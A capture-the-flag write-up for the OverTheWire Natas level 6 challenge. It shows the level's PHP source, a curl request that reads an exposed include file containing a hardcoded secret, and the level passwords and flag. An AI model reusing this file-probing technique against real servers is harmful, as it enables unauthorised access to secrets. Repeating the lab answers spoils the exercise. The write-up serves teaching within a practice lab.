# Natas6

*	user: `natas6`
*	pass: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
*	url: `http://natas6.natas.labs.overthewire.org`
*	flag: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

## Procedure

1.	By clicking on `View sourcecode` a PHP script is shown

		<?

		include "includes/secret.inc";

		if(array_key_exists("submit", $_POST)) {
				if($secret == $_POST['secret']) {
				print "Access granted. The password for natas7 is <censored>";
			} else {
				print "Wrong secret";
			}
		}
		?>

2.	The script says that `secret` parameter in the `POST` is checked
	against variable `$secret`. Furthermore, file `includes/secret.inc`
	is imported. Let's see what it contains

		$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
		<?
		$secret = "FOEIUWGHFEEUHOFUOIU";
		?>

3.	Go back to the home page and try to provide the secret
	`FOEIUWGHFEEUHOFUOIU`. Bingo!

		Access granted. The password for natas7 is
		7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
